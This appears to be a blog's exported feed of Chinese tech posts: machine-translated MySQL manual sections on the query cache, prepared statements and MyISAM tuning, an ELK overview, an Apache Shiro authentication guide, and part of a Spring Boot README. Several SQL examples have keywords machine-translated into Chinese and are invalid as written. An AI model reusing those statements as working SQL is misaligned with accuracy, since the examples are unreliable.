CURDATE() CURRENT_DATE() CURRENT_TIME() CURRENT_TIMESTAMP() CURRENT_USER() CURTIME() DATABASE() ENCRYPT() 有一个参数 FOUND_ROWS() GET_LOCK() IS_FREE_LOCK() IS_USED_LOCK() LAST_INSERT_ID() LOAD_FILE() MASTER_POS_WAIT() NOW() PASSWORD() RAND() RANDOM_BYTES() RELEASE_ALL_LOCKS() RELEASE_LOCK() SLEEP() SYSDATE() UNIX_TIMESTAMP() 没有参数 USER() UUID() UUID_SHORT() 在这些条件下也不会缓存查询： 它指的是用户定义的函数（UDF）或存储的函数。 它指的是用户变量或本地存储的程序变量。 它是指在表mysql， INFORMATION_SCHEMA或 performance_schema数据库。 它指的是任何分区表。 它具有以下任何一种形式： 选择…锁定共享模式SELECT … FOR UPDATESELECT … INTO OUTFILE ……SELECT … INTO DUMPFILE …SELECT * FROM … WHERE autoincrement_col为NULL最后一个表单未缓存，因为它用作ODBC解决方法以获取最后一个插入ID值。请参见第27章连接器和API的Connector / ODBC部分 。 使用SERIALIZABLE隔离级别的事务中的语句 也无法缓存，因为它们使用LOCK IN SHARE MODE锁定。 它使用TEMPORARY表格。 它不使用任何表。 它会生成警告。 用户对任何涉及的表都具有列级权限。 8.10.3.2查询缓存SELECT选项注意从MySQL 5.7.20开始，不推荐使用查询缓存，并在MySQL 8.0中删除。 可以在SELECT语句中指定两个与查询缓存相关的选项 ： SQL_CACHE 如果查询结果是可缓存的，并且query_cache_type系统变量的值为ON或 ，则缓存查询结果 DEMAND。 SQL_NO_CACHE 服务器不使用查询缓存。它既不检查查询缓存，也不检查结果是否已缓存，也不缓存查询结果。 例子： SELECT SQL_CACHE id，name FROM customer;SELECT SQL_NO_CACHE id，name FROM customer;8.10.3.3查询缓存配置注意从MySQL 5.7.20开始，不推荐使用查询缓存，并在MySQL 8.0中删除。 该have_query_cache服务器系统变量指示查询缓存是否可用： MySQL的&gt; SHOW VARIABLES LIKE ‘have_query_cache’; —————— + ——- +| Variable_name | 值| —————— + ——- +| have_query_cache | 是的| —————— + ——- +使用标准MySQL二进制文件时YES，即使禁用了查询缓存，此值也始终 如此。 其他几个系统变量控制查询缓存操作。这些可以在启动mysqld时在选项文件或命令行中设置。查询缓存系统变量都具有以…开头的名称 query_cache_。第5.1.7节“服务器系统变量”中对它们进行了简要介绍 ，并在此处给出了其他配置信息。 要设置查询缓存的大小，请设置 query_cache_size系统变量。将其设置为0将禁用查询缓存，设置也是如此query_cache_type=0。默认情况下，禁用查询缓存。这是使用默认大小1M实现的，默认 query_cache_type值为0。 要显着降低开销，请在query_cache_type=0不使用查询缓存的情况下启动服务器 。 注意使用Windows配置向导安装或配置MySQL时，query_cache_size将根据可用的不同配置类型自动为您配置默认值 。使用Windows配置向导时，由于所选配置，可能会启用查询缓存（即设置为非零值）。查询缓存也由query_cache_type变量的设置控制 。配置完成后，检查my.ini文件中设置的这些变量的值 。 设置query_cache_size 为非零值时，请记住查询缓存需要最小大小约40KB才能分配其结构。（确切的大小取决于系统架构。）如果将值设置得太小，您将收到警告，如下例所示： MySQL的&gt; SET GLOBAL query_cache_size = 40000;查询正常，0行受影响，1警告（0.00秒） MySQL的&gt; SHOW WARNINGS\G*** 1. row ** *** 等级：警告 代码：1282消息：查询缓存未能设置大小39936; 新查询缓存大小为0 MySQL的&gt; SET GLOBAL query_cache_size = 41984;查询OK，0行受影响（0.00秒） MySQL的&gt; SHOW VARIABLES LIKE ‘query_cache_size’; —————— + ——- +| Variable_name | 值| —————— + ——- +| query_cache_size | 41984 | —————— + ——- +要使查询缓存实际上能够保存任何查询结果，必须将其大小设置得更大： MySQL的&gt; SET GLOBAL query_cache_size = 1000000;查询正常，0行受影响（0.04秒） MySQL的&gt; SHOW VARIABLES LIKE ‘query_cache_size’; —————— + ——– +| Variable_name | 值| —————— + ——– +| query_cache_size | 999424 | —————— + ——– +一排（0.00秒）该query_cache_size值与最近的1024字节块对齐。因此，报告的值可能与您指定的值不同。 如果查询缓存大小大于0，则该 query_cache_type变量会影响其工作方式。此变量可以设置为以下值： 值的 缓存0或OFF阻止缓存或检索缓存结果的值。 除了以那些开头的语句之外的 值的值1或ON启用缓存 SELECT SQL_NO_CACHE。 值的值2或 DEMAND导致仅缓存那些以＃开头的语句SELECT SQL_CACHE。 如果query_cache_size为0，则还应将query_cache_type变量设置 为0.在这种情况下，服务器根本不会获取查询缓存互斥锁，这意味着无法在运行时启用查询缓存，并且减少了查询执行的开销。 设置该GLOBAL query_cache_type值可确定在进行更改后连接的所有客户端的查询缓存行为。各个客户端可以通过设置SESSION query_cache_type值来控制自己连接的缓存行为 。例如，客户端可以禁用查询缓存的使用，如下所示： MySQL的&gt; SET SESSION query_cache_type = OFF;如果设置query_cache_type 为服务器启动（而不是在运行时使用 SET 语句），则只允许使用数值。 要控制可以缓存的单个查询结果的最大大小，请设置 query_cache_limit系统变量。默认值为1MB。 注意不要将缓存的大小设置得太大。由于线程需要在更新期间锁定缓存，因此您可能会看到一个非常大的缓存的锁争用问题。 注意您可以SET 使用 命令行或配置文件中的选项，使用该语句 设置可在运行时为查询缓存指定的最大大小 。 –maximum-query_cache_size=32M 当要缓存查询时，其结果（发送到客户端的数据）在结果检索期间存储在查询缓存中。因此，数据通常不会在一个大块中处理。查询高速缓存分配用于按需存储该数据的块，因此当填充一个块时，分配新块。由于内存分配操作成本高昂（按时间），查询缓存会分配具有query_cache_min_res_unit 系统变量给定的最小大小的块 。执行查询时，将最后一个结果块修剪为实际数据大小，以释放未使用的内存。根据服务器执行的查询类型，您可能会发现调整以下值的方法很有帮助 query_cache_min_res_unit： 默认值为 query_cache_min_res_unit 4KB。这应该适用于大多数情况。 如果您有大量具有较小结果的查询，则默认块大小可能会导致内存碎片，如大量空闲块所示。由于内存不足，碎片可以强制查询缓存从缓存中删除（删除）查询。在这种情况下，减少值 query_cache_min_res_unit。由于修剪而删除的空闲块和查询的数量由Qcache_free_blocks和 Qcache_lowmem_prunes 状态变量的值给出 。 如果您的大多数查询都有大的结果（检查 Qcache_total_blocks和 Qcache_queries_in_cache 状态变量），您可以通过增加来提高性能 query_cache_min_res_unit。但是，请注意不要太大（请参阅上一项）。 8.10.3.4查询缓存状态和维护注意从MySQL 5.7.20开始，不推荐使用查询缓存，并在MySQL 8.0中删除。 要检查MySQL服务器中是否存在查询缓存，请使用以下语句： MySQL的&gt; SHOW VARIABLES LIKE ‘have_query_cache’; —————— + ——- +| Variable_name | 值| —————— + ——- +| have_query_cache | 是的| —————— + ——- +您可以对查询缓存进行碎片整理，以便通过FLUSH QUERY CACHE语句更好地利用其内存。该语句不会从缓存中删除任何查询。 该RESET QUERY CACHE语句从查询缓存中删除所有查询结果。该 FLUSH TABLES声明也做到这一点。 要监视查询缓存性能，请使用 SHOW STATUS查看缓存状态变量： MySQL的&gt; SHOW STATUS LIKE ‘Qcache%’; ————————- + ——– +| Variable_name | 值| ————————- + ——– +| Qcache_free_blocks | 36 || Qcache_free_memory | 138488 || Qcache_hits | 79570 || Qcache_inserts | 27087 || Qcache_lowmem_prunes | 3114 || Qcache_not_cached | 22989 || Qcache_queries_in_cache | 415 || Qcache_total_blocks | 912 | ————————- + ——– +第5.1.9节“服务器状态变量” 中给出了每个变量的描述 。这里描述了它们的一些用途。 SELECT 查询 总数由以下公式给出： Com_select Qcache_hits+解析器发现错误的查询该Com_select值由以下公式给出： Qcache_inserts Qcache_not_cached+在列权限检查期间发现错误的查询查询缓存使用可变长度的块，所以 Qcache_total_blocks与 Qcache_free_blocks可指示查询高速缓冲存储器碎片。之后 FLUSH QUERY CACHE，只剩下一个空闲区块。 每个缓存的查询至少需要两个块（一个用于查询文本，一个或多个用于查询结果）。此外，查询使用的每个表都需要一个块。但是，如果两个或多个查询使用同一个表，则只需要分配一个表块。 Qcache_lowmem_prunes状态变量 提供的信息 可以帮助您调整查询缓存大小。它计算已从缓存中删除的查询数，以释放内存以缓存新查询。查询缓存使用最近最少使用（LRU）策略来决定从缓存中删除哪些查询。调整信息在 第8.10.3.3节“查询高速缓存配置”中给出。 8.10.4准备好的语句和存储程序的缓存对于客户端可能在会话期间多次执行的某些语句，服务器会将语句转换为内部结构并缓存要在执行期间使用的结构。缓存使服务器能够更有效地执行，因为它避免了在会话期间再次需要时重新转换语句的开销。这些语句发生转换和缓存： 准备好的语句，包括在SQL级别（使用PREPARE语句）处理的语句和使用二进制客户端/服务器协议（使用mysql_stmt_prepare()C API函数）处理的语句 。所述 max_prepared_stmt_count 系统变量控制语句的服务器高速缓存的总数量。（所有会话中准备好的语句总数。） 存储的程序（存储过程和函数，触发器和事件）。在这种情况下，服务器转换并缓存整个程序体。该 stored_program_cache系统变量指示存储的程序每个会话的服务器缓存的大致数量。 服务器基于每个会话维护预准备语句和存储程序的高速缓存。其他会话无法访问为一个会话缓存的语句。会话结束时，服务器会丢弃为其缓存的任何语句。 当服务器使用缓存的内部语句结构时，必须注意结构不会过时。对于语句使用的对象，可能会发生元数据更改，从而导致当前对象定义与内部语句结构中表示的定义不匹配。DDL语句（例如创建，删除，更改，重命名或截断表，或分析，优化或修复表）的元数据发生更改。表内容更改（例如，使用INSERT或 UPDATE）不更改元数据，也不更改SELECT语句。 以下是问题的说明。假设客户准备此声明： 123456789101112131415161718192021222324252627282930从&apos;SELECT * FROM t1&apos;预备s1;将SELECT *内部结构扩展为表中列的列表。如果修改了表中的列集，则ALTER TABLE预准备语句将过期。如果服务器在下次客户端执行时未检测到此更改s1，则预准备语句将返回不正确的结果。为了避免由预准备语句引用的表或视图的元数据更改导致的问题，服务器会检测这些更改并在下次执行时自动重新表示该语句。也就是说，服务器重新声明语句并重建内部结构。在从表定义高速缓存中刷新引用的表或视图之后，也会发生重新分析，或者隐式地为缓存中的新条目腾出空间，或者显式由于FLUSH TABLES。同样，如果存储程序使用的对象发生更改，则服务器会重新编译程序中受影响的语句。服务器还检测表达式中对象的元数据更改。这些可能会在特定的存储方案，如语句中使用DECLARE CURSOR或流量控制语句，如 IF， CASE和 RETURN。为避免重新解析整个存储的程序，服务器仅在需要时重新编译程序中受影响的语句或表达式。例子：假设更改了表或视图的元数据。重新解析为一个发生SELECT *访问的表或视图的程序中，但不是一个 SELECT *不访问该表或视图。当语句受到影响时，如果可能，服务器仅对其进行部分重新分析。请考虑以下 CASE声明：情况case_expr 什么时候when_expr1...... 什么时候when_expr2...... 什么时候when_expr3...... ...结束案例如果元数据更改仅影响，则会重新解析该表达式。 并且其他表达式没有被重新解析。 WHEN when_expr3case_exprWHEN重新分析使用对原始转换为内部表单有效的默认数据库和SQL模式。服务器尝试最多重新解析三次。如果所有尝试都失败，则会发生错误重新分析是自动的，但在发生这种情况时，会减少准备好的语句和存储的程序性能。对于预处理语句， Com_stmt_reprepare 状态变量跟踪重新表示的数量。]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>SQL优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ELK 简介]]></title>
    <url>%2F2018%2F03%2F24%2Flog%2Felk-2%2F</url>
    <content type="text"><![CDATA[1转载链接：http://www.jianshu.com/p/97fcb10c3556 ElasticSearch是一个基于Lucene构建的开源，分布式，RESTful 搜索引擎。 Logstash传输和处理你的日志、事务或其他数据。 Kibana将 Elasticsearch 的数据分析并渲染为可视化的报表。 为什么使用 ELK ？ 对于有一定规模的公司来说，通常会很多个应用，并部署在大量的服务器上。运维和开发人员常常需要通过查看日志来定位问题。如果应用是集群化部署，试想如果登录一台台服务器去查看日志，是多么费时费力。 而通过 ELK 这套解决方案，可以同时实现日志收集、日志搜索和日志分析的功能。 ELK 架构 说明 以上是 ELK 技术栈的一个架构图。从图中可以清楚的看到数据流向。 Beats 是单一用途的数据传输平台，它可以将多台机器的数据发送到 Logstash 或 ElasticSearch。但 Beats 并不是不可或缺的一环，所以本文中暂不介绍。 Logstash 是一个动态数据收集管道。支持以 TCP/UDP/HTTP 多种方式收集数据（也可以接受 Beats 传输来的数据），并对数据做进一步丰富或提取字段处理。 ElasticSearch 是一个基于 JSON 的分布式的搜索和分析引擎。作为 ELK 的核心，它集中存储数据。 Kibana 是 ELK 的用户界面。它将收集的数据进行可视化展示（各种报表、图形化数据），并提供配置、管理 ELK 的界面。 支持图形各种数据图形]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>日志收集</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL优化【MyISAM-表优化】]]></title>
    <url>%2F2018%2F03%2F24%2Fmysql%2Foptimization-sql-myisam%2F</url>
    <content type="text"><![CDATA[8.6.1优化MyISAM查询1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374加快查询MyISAM表的一些常规提示 ：为了帮助MySQL更好地优化查询，请使用 ANALYZE TABLE或运行 myisamchk -在载入数据之后对其进行分析。这会更新每个索引部分的值，以指示具有相同值的平均行数。（对于唯一索引，这总是1.）当你基于非常量表达式连接两个表时，MySQL使用它来决定选择哪个索引。您可以通过使用和检查值来检查表格分析的结果 。myisamchk --description --verbose显示索引分布信息。 SHOW INDEX FROM tbl_nameCardinality要根据索引对索引和数据进行排序，请使用 myisamchk --sort-index --sort-records = 1 （假设您要对索引1进行排序）。如果您有一个唯一索引，您希望根据索引按顺序读取所有行，则这是一种更快查询的好方法。第一次以这种方式排列大表时，可能需要很长时间。尽量避免SELECT 对MyISAM经常更新的表进行复杂的查询，以避免由于读者和作者之间的争用而发生的表锁定问题。MyISAM支持并发插入：如果一个表在数据文件中间没有空闲块，那么可以INSERT在其他线程从表中读取数据的同时将新行插入到它中。如果能做到这一点很重要，请考虑以避免删除行的方式使用表。另一种可能性是OPTIMIZE TABLE在删除了很多行之后运行对表进行碎片整理。这种行为是通过设置concurrent_insert变量来改变的 。您可以强制添加新行（因此允许并发插入），即使在已删除行的表中也是如此。请参见第8.11.3节“并发插入”。对于MyISAM频繁更改的表，尽量避免所有变长列（VARCHAR， BLOB，和 TEXT）。如果该表甚至包含单个可变长度列，该表使用动态行格式。请参阅第15章，备用存储引擎。仅仅因为行变大，将表分割成不同的表通常是没有用的。在访问行时，最大的性能影响是找到行的第一个字节所需的磁盘查找。找到数据后，大多数现代磁盘可以为大多数应用程序快速读取整行。分割表格的唯一情况是，如果它是一个MyISAM使用动态行格式的 表格，您可以更改为固定的行大小，或者您经常需要扫描表格但不需要大多数列。请参阅第15章，备用存储引擎。如果您通常按顺序检索行， 请使用它 。在对表格进行大量更改后使用此选项，您可能会获得更高的性能。 ALTER TABLE ... ORDER BY expr1, expr2, ...expr1, expr2, ...如果您经常需要根据来自很多行的信息计算结果（如计数），则最好引入一个新表并实时更新计数器。以下表单的更新速度非常快：UPDATE tbl_nameSET count_col= count_col+1 WHERE key_col= constant;当你使用MySQL存储引擎时，这是非常重要的，例如MyISAM只有表级锁定（多个读者使用单个编写器）。这也为大多数数据库系统提供了更好的性能，因为在这种情况下行锁管理器不太容易。OPTIMIZE TABLE 定期 使用以避免使用动态格式MyISAM表进行分段 。请参见 第15.2.3节“MyISAM表格存储格式”。MyISAM使用DELAY_KEY_WRITE=1table选项 声明一个表 会使索引更新速度更快，因为它们在表关闭之前不会刷新到磁盘。缺点是，如果某个表在打开时杀死服务器，则必须通过运行带有该--myisam-recover-options 选项的服务器或在重新启动服务器之前运行myisamchk来确保表可以正常运行 。（但是，即使在这种情况下，也不能DELAY_KEY_WRITE因为使用而丢失任何东西 ，因为密钥信息总是可以从数据行中生成。）字符串会自动在MyISAM索引中进行前缀和结尾空间压缩。请参见 第13.1.14节“CREATE INDEX语法”。您可以通过在应用程序中缓存查询或答案，然后一起执行许多插入或更新来提高性能。在此操作期间锁定表可确保索引缓存在所有更新后仅刷新一次。您还可以利用MySQL的查询缓存来获得类似的结果; 请参见 第8.10.3节“MySQL查询缓存”。 8.6.2 MyISAM表的批量数据加载12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182这些性能提示补充了第8.2.4.1节“优化INSERT语句”中有关快速插入的一般准则。对于MyISAM表，SELECT如果数据文件中间没有删除的行，则可以使用并行插入在语句正在运行的同时添加行 。请参见第8.11.3节“并发插入”。通过一些额外的工作，当表中有许多索引时，可以使 表LOAD DATA INFILE运行得更快 MyISAM。使用以下步骤：执行FLUSH TABLES 语句或mysqladmin flush-tables命令。使用myisamchk --keys-used = 0 -rq /path/to/db/tbl_name 删除表中所有索引的使用。用数据插入表格 LOAD DATA INFILE。这不会更新任何索引，因此速度非常快。如果您打算以后只从表中读取数据，请使用myisampack进行压缩。请参见 第15.2.3.3节“压缩表特征”。用myisamchk -rq /path/to/db/tbl_name重新创建索引。这会在将内容写入磁盘之前在内存中创建索引树，这比在更新索引期间快得多，LOAD DATA INFILE因为它避免了大量磁盘搜索。得到的索引树也是完美平衡的。执行FLUSH TABLES 语句或mysqladmin flush-tables命令。LOAD DATA INFILE如果MyISAM插入数据的表为空，则自动执行上述优化。自动优化和明确使用过程之间的主要区别是，您可以让myisamchk为索引创建分配更多的临时内存，而不是您希望服务器在执行LOAD DATA INFILE语句时为索引重新创建分配内存。您还可以MyISAM使用以下语句而不是myisamchk来禁用或启用表的非唯一索引 。如果您使用这些语句，则可以跳过这些 FLUSH TABLES操作：ALTER TABLE tbl_nameDISABLE KEYS;ALTER TABLE tbl_nameENABLE KEYS;要加快INSERT使用多个非事务表的语句执行的操作，请锁定您的表：锁定表写一个;插入一个值（1,23），（2,34），（4,33）;插入一个值（8,26），（6,29）;...解锁表;这有利于性能，因为索引缓冲区在所有INSERT语句完成后只刷新到磁盘一次 。通常情况下，会有多少个索引缓冲区刷新与INSERT 语句一样多。如果可以插入所有行，则不需要显式锁定语句 INSERT。锁定还会降低多连接测试的总时间，但个别连接的最长等待时间可能会因为等待锁定而增加。假设五个客户端尝试同时执行插入操作，如下所示：连接1有1000个插入连接2,3和4做1插入连接5有1000个插入如果不使用锁定，则连接2,3和4会在1和5之前完成。如果使用锁定，连接2,3和4可能在1或5之前未完成，但总时间应该约为40％更快。INSERT， UPDATE并且 DELETEMySQL中的操作非常快，但是通过在所有超过大约五次连续插入或更新的事物中添加锁，您可以获得更好的整体性能。如果你做了很多次连续的插入操作，你可以LOCK TABLES稍后 再做UNLOCK TABLES一次（每1,000行左右），以允许其他线程访问表。这仍然会带来不错的性能提升。INSERT加载数据的速度仍然比LOAD DATA INFILE使用刚刚列出的策略时慢得多 。要提高MyISAM 表的性能，对于这两者， LOAD DATA INFILE并INSERT通过增加key_buffer_size系统变量来放大密钥缓存 。请参见第5.1.1节“配置服务器”。 8.6.3优化REPAIR TABLE语句1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071REPAIR TABLE对于 MyISAM表格类似于使用 myisamchk进行修复操作，以及一些相同的性能优化适用：myisamchk有控制内存分配的变量。您可以通过设置这些变量来提高性能，如 第4.6.3.6节“myisamchk内存使用情况”中所述。因为REPAIR TABLE，同样的原则适用，但由于修复是由服务器完成的，因此您可以设置服务器系统变量而不是 myisamchk变量。此外，除了设置内存分配变量之外，增加 myisam_max_sort_file_size 系统变量还会增加修复将使用更快的文件排序方法的可能性，并避免缓存键方法的修复速度降低。检查并确保有足够的可用空间来存放表文件的副本后，将该变量设置为系统的最大文件大小。可用空间必须在包含原始表格文件的文件系统中可用。假设使用以下选项设置myisamchk表修复操作来设置其内存分配变量：--key_buffer_size = 128M --myisam_sort_buffer_size = 256M--read_buffer_size = 64M --write_buffer_size = 64M其中一些myisamchk变量对应于服务器系统变量：myisamchk变量 系统变量key_buffer_size key_buffer_sizemyisam_sort_buffer_size myisam_sort_buffer_sizeread_buffer_size read_buffer_sizewrite_buffer_size 没有每个服务器系统变量都可以在运行时设置，其中一些（myisam_sort_buffer_size， read_buffer_size）除了全局值之外还有一个会话值。设置会话值会限制更改对当前会话的影响，并且不会影响其他用户。更改全局变量（key_buffer_size， myisam_max_sort_file_size）也会影响其他用户。因为 key_buffer_size，您必须考虑到缓冲区是与这些用户共享的。例如，如果将myisamchk key_buffer_size变量设置为128MB，则可以设置相应的值 key_buffer_size系统变量大于此值（如果它尚未设置为较大），以允许按其他会话中的活动使用密钥缓冲区。但是，更改全局密钥缓冲区大小会使缓冲区失效，从而导致磁盘I / O增加以及其他会话减速。避免此问题的替代方法是使用单独的密钥缓存，为其分配要修复的表中的索引，并在修复完成时将其解除分配。请参见 第8.10.2.2节“多键缓存”。根据前面的说明，REPAIR TABLE可以按如下所示进行操作，以使用与myisamchk命令类似的设置。这里分配了一个单独的128MB密钥缓冲区，假定文件系统允许文件大小至少为100GB。SET SESSION myisam_sort_buffer_size = 256 * 1024 * 1024;SET SESSION read_buffer_size = 64 * 1024 * 1024;SET GLOBAL myisam_max_sort_file_size = 100 * 1024 * 1024 * 1024;SET GLOBAL repair_cache.key_buffer_size = 128 * 1024 * 1024;CACHE INDEX tbl_nameIN repair_cache;LOAD INDEX INTO CACHE tbl_name;修理桌tbl_name;SET GLOBAL repair_cache.key_buffer_size = 0;如果您打算更改全局变量，但希望仅在REPAIR TABLE操作期间这样做才能最小化影响其他用户，请将其值保存在用户变量中，然后再恢复。例如：SET @old_myisam_sort_buffer_size = @@ global.myisam_max_sort_file_size;SET GLOBAL myisam_max_sort_file_size = 100 * 1024 * 1024 * 1024;REPAIR TABLE tbl_name;SET GLOBAL myisam_max_sort_file_size = @old_myisam_max_sort_file_size;REPAIR TABLE如果您希望这些值在默认情况下有效，那么可以在服务器启动时全局设置 影响的系统变量。例如，将这些行添加到服务器my.cnf文件中：的[mysqld]myisam_sort_buffer_size = 256M的key_buffer_size = 1Gmyisam_max_sort_file_size = 100G这些设置不包括 read_buffer_size。read_buffer_size全局设置 为较大的值对于所有会话都是如此，并且可能会导致性能受损，原因是具有多个同时会话的服务器的内存分配过多。]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>SQL优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[权限系统_shiro_验证流程]]></title>
    <url>%2F2018%2F03%2F24%2Fservice-permission%2Fshiro-2%2F</url>
    <content type="text"><![CDATA[权限分为：操作权限、业务权限、数据权限三种 １、操作权限 现阶段操作权限都是使用shiro进行控制 shiro 也是基于RBAC思想 【不懂的小朋友就去百度RBAC】 shiro 的表设计 最基本的无张表：用户表、用户角色表、角色表、角色操作权限表、操作权限表、 一般也满足使用了 复杂点有用户组表 角色组表 等等 这些RBAC都有介绍 那么 What is Apache Shiro?Apache Shiro 是一个强大而灵活的开源安全框架，它干净利落地处理身份认证，授权，企业会话管理和加密。 这个比较牛逼、集成了 shiro 什么权限怎么控制的你就不用管了、照着他的文档使用就可以了、页面操作按钮【可以使用Tag控制】web.xml 添加了拦截器之后、他能保证整个会话中都知道用户的权限、一直放到缓存中、你在整个流程中想要什么时候查询整个用户的角色、ｉｄ都可以直接通过他的方法拿到、那么他是怎么实现的呢？其实把他理解成一个封装工具或者一个安全框架也行、契合到项目中使用、简洁我们自己的代码、而且他这个工具还是Apache的 在安全方面还是比较值得信任的 那么他做了什么呢？ 官方有以下说明： 验证用户来核实用户身份 对用户访问进行控制 判断用户是否被分配了一个确定的安全角色 判断用户是否被允许做某事 在任何环境下使用SessionAPI 即使没有 web EJB容器 在身份验证、访问控制期间、会话的生命周期、对事件做出反应 聚集一个或多个用户安全数据源、并作为一个单一复合用户“视图” 启动单点登陆【SSO】功能 为没有关联登陆的用户启用 Remember Me服务 。。。 关于实现原理： shiro 团队 把这四个功能成为 应用程序的四大基石：身份认证、授权、会话管理、加密 shiro核心部分： Authentication：有时也简称为“登录”，这是一个证明用户是他们所说的他们是谁的行为。 Authorization：访问控制的过程，也就是绝对“谁”去访问“什么”。 Session Management：管理用户特定的会话，即使在非 Web 或 EJB 应用程序。 Cryptography：通过使用加密算法保持数据安全同时易于使用。 看不懂？那么想想我们自己的登陆系统应该是怎样的呢？ 那么这样就好理解了 登陆就像是Authentication 管理用户标识 谁是谁 那么Authorization就像是登陆系统中的查看角色权限等功能＼管理谁应该访问什么资源 Session Management 就是一个管理会话的工具 将返还的ticket放置在哪里传递给用户 Cryptography 暂时就理解为加密算法 额外功能： Web Support：Shiro 的 web 支持的 API 能够轻松地帮助保护 Web 应用程序。 Caching：缓存是 Apache Shiro 中的第一层公民，来确保安全操作快速而又高效。 Concurrency：Apache Shiro 利用它的并发特性来支持多线程应用程序。 Testing：测试支持的存在来帮助你编写单元测试和集成测试，并确保你的能够如预期的一样安全。 &quot;Run As&quot;：一个允许用户假设为另一个用户身份（如果允许）的功能，有时候在管理脚本很有用。 &quot;Remember Me&quot;：在会话中记住用户的身份，所以他们只需要在强制时候登录。 分解下： 先说认证 Authenticating Subjects （验证 Subjects） 系统分为了三个不同的步骤： 1、手机Subjects提交的Principals（身份）和Credentials（凭证） 2、提交Principals（身份）和Credentials（凭证）进行认证 3、如果提交成功、则允许访问、否则则重新认证或者阻止进行访问 代码如下：Step 1 ：收集 Subject 的 的 Principals( 身份)和 和 Credentials( 凭证) UsernamePasswordToken token = new UsernamePasswordToken(username, password);Step 2 ：提交 Subject 的 的 Principals( 身份)和 和 Credentials( Subject currentUser = SecurityUtils.getSubject(); currentUser.login(token);Step3 成功： 应用程序继续执行、并把subject.isAuthenticated(true) 失败：返回登录？访问次数过多进行锁定？等等可以用户自己判断 那么关于注销呢 也是easy调用方法如下： currentUser.logout(); //removes all identifying information an invalidates their session too. 贴一下官方文档原图体会下具体流程： 功能模块定义1、Authenticator（认证器） shiro中默认使用了一个ModularRealmAuthenticator实例 这个实例中同样支持着一个Realm以及多个Realm的应用通过配置也可以修改这个配置 在shiro.ini 中配置响应数据 2、AuthenticationStrategy（认证策略） 当一个应用程序配置了两个或者以上的Realm时候、就需要依靠内部组件来配置认证策略 在这个规则中使用到了AuthenticationStrategy 一个无状态组件 在身份验证尝试中会询问4次 12341、在任何 Realm 被调用之前被询问；2. 在一个单独的 Realm 的 getAuthenticationInfo 方法被调用之前立即被询问；3. 在一个单独的 Realm 的 getAuthenticationInfo 方法被调用之后立即被询问；4. 在所有的 Realm 被调用后询问。 然后AuthenticationStrategy 会总结合并所有的返回值 并最终确定Subject的最终ID值 （即Principals身份） 3、Realm 的验证顺序 关于Realm的验证顺序 有两种 一种是Implicit ordering(隐式排列) 另一种是 Explicit Ordering(显示排列) 1234567891011121314151617181920212223242526在shiro.ini中配置如下：隐式排列：blahRealm = com.company.blah.Realm…fooRealm = com.company.foo.Realm…barRealm = com.company.another.Realm或者securityManager.realms = $blahRealm, $fooRealm, $barRealm显示排列 如果你想明确地定义 Realm 的交互顺序，忽略它们是如何定义的，你可以设置 securityManager 的属性作为一个明确的集合属性。例如，如果使用上面的定义，但你想 blahRealm 最后被请求而不是第一个：blahRealm = com.company.blah.Realm…fooRealm = com.company.foo.Realm…barRealm = com.company.another.RealmsecurityManager.realms = $fooRealm, $barRealm,$blahRealm当你显式地配置 securityManager.realms 的属性是，只有已引用的 Realm 将会在SecurityManager 中被配置。这意味着你能够在 INI 文件中定义 5 个 realm，但是实际上只能使用 3 个如果只有这 3 个被引用到 realm 的属性中的话.这是和隐式 realm 顺序不同的，所有可用的隐式的 realm 都将被使用。 至此 shiro身份认证顺序逻辑结束 下一篇Shiro Authorization （ 授权） 那么 shiro 的使用呢 maven 导入 shiro 包 1234567891011121314&lt;dependency&gt; &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt; &lt;artifactId&gt;shiro-core&lt;/artifactId&gt; &lt;version&gt;1.1.0&lt;/version&gt;&lt;/dependency另外 shiro 使用了 slf4j 作为日志记录工具所以还要导入 slf4j 相关 jar 包&lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-simple&lt;/artifactId&gt; &lt;version&gt;1.6.1&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt;&lt;/dependency&gt;]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>权限认证</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[spring官网提供的 spring boot实例]]></title>
    <url>%2F2018%2F03%2F24%2Fspring-boot%2Fopen-source-project%2F</url>
    <content type="text"><![CDATA[github开源项目–springboot = Spring Boot image:https://ci.spring.io/api/v1/teams/spring-boot/pipelines/spring-boot-2.0.x/jobs/build/badge[&quot;Build Status”, link=”https://ci.spring.io/teams/spring-boot/pipelines/spring-boot-2.0.x?groups=Build&quot;] image:https://badges.gitter.im/Join Chat.svg[“Chat”,link=”https://gitter.im/spring-projects/spring-boot?utm_source=badge&amp;utm_medium=badge&amp;utm_campaign=pr-badge&amp;utm_content=badge&quot;]:docs: https://docs.spring.io/spring-boot/docs/current-SNAPSHOT/reference Spring Boot makes it easy to create Spring-powered, production-grade applications andservices with absolute minimum fuss. It takes an opinionated view of the Spring platformso that new and existing users can quickly get to the bits they need. You can use Spring Boot to create stand-alone Java applications that can be started usingjava -jar or more traditional WAR deployments. We also provide a command line toolthat runs spring scripts. Our primary goals are: Provide a radically faster and widely accessible getting started experience for allSpring development Be opinionated out of the box, but get out of the way quickly as requirements start todiverge from the defaults Provide a range of non-functional features that are common to large classes of projects(e.g. embedded servers, security, metrics, health checks, externalized configuration) Absolutely no code generation and no requirement for XML configuration == Installation and Getting StartedThe {docs}/htmlsingle/[reference documentation] includes detailed{docs}/htmlsingle/#getting-started-installing-spring-boot[installation instructions]as well as a comprehensive {docs}/htmlsingle/#getting-started-first-application[getting started] guide. Documentation is published in {docs}/htmlsingle/[HTML],{docs}/pdf/spring-boot-reference.pdf[PDF] and {docs}/epub/spring-boot-reference.epub[EPUB]formats. Here is a quick teaser of a complete Spring Boot application in Java: [source,java,indent=0]123456789101112131415161718import org.springframework.boot.*;import 